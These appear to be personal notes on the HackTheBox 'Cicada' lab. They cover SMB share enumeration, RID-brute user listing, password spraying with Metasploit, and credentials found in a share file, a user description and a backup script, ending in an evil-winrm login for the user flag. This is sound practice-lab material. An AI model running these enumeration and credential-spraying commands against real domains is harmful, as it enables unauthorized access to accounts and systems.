## SMBCLIENT output

smbclient -L //10.10.11.35
Password for [WORKGROUP\anmol]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	DEV             Disk      
	HR              Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available

Got text from HR

smbclient //10.10.11.35/HR and then get file Notice from HR which has basic creds

Cicada$M6Corpb*@Lp#nZp!8

## Install netexec

netexec smb -i <target ip> -u guest -p '' --users --rid-brute (this command gives out list of users)

Gather info of users of type


SMB         10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)

SidTypeUser

Now run usernames with password we got earlier to get pair. Used msfconsole for this - module smb_login

WE find username is michael.wrightson but he also doesnt have access to admin share on smb.

Use his creds in netexec command and we find in desription

netexec smb 10.10.11.35 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users --rid-brute
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.10.11.35     445    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.10.11.35     445    CICADA-DC        Administrator                 2024-08-26 20:08:03 3       Built-in account for administering the computer/domain
SMB         10.10.11.35     445    CICADA-DC        Guest                         2024-08-28 17:26:56 0       Built-in account for guest access to the computer/domain
SMB         10.10.11.35     445    CICADA-DC        krbtgt                        2024-03-14 11:14:10 3       Key Distribution Center Service Account
SMB         10.10.11.35     445    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 1        
SMB         10.10.11.35     445    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 3        
SMB         10.10.11.35     445    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0        
SMB         10.10.11.35     445    CICADA-DC        david.orelious                2024-03-14 12:17:29 2       Just in case I forget my password is aRt$Lp#7t*VQ!3
SMB         10.10.11.35     445    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 2    

We get password for david. He also doesnt have access to ADMIN share. But he does have access to DEV share. From there download file from within msfconsole.

We get Backup Script ps1 which has emilys creds.

Emily has access to machine. We can login using evil-winrm

evil-winrm -i 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'

User flag on Desktop.

## 27th March 2025

Machine expired since I didnt come back to it. Read some writeup for root.
https://benheater.com/hackthebox-cicada/
